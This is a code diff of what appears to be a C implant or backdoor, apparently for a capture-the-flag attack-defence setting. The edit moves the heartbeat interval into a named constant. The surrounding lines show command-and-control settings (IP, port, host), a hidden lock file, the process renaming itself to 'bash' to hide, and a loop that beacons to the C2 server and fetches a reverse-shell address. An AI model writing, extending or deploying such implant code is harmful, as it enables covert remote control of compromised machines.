@@ -26,6 +26,7 @@
 #define C2_IP "10.103.6.2"
 #define C2_PORT 26666
 #define C2_HOST "pss"
+#define C2_HEARTBEAT_INTERVAL 60
 #define SINGLE_INSTANCE_CHECK_FILE "/tmp/.php_lock"
 
 static char last_flag[256] = ""; // 声明为空字符串, 不要填入内容
@@ -272,9 +273,9 @@ int main(int argc, char *argv[]) {
         memset(argv[0], 0, strlen(argv[0]));
         strncpy(argv[0], "bash", orig_len);
 
-    unsigned ticks = 60;
+    unsigned ticks = C2_HEARTBEAT_INTERVAL;
     while (1) {
-        if (ticks >= 60) {
+        if (ticks >= C2_HEARTBEAT_INTERVAL) {
             int res = httpSendHeartbeat();
             if (res == 1) {
                 char *rs = httpGetRevshellAddr();
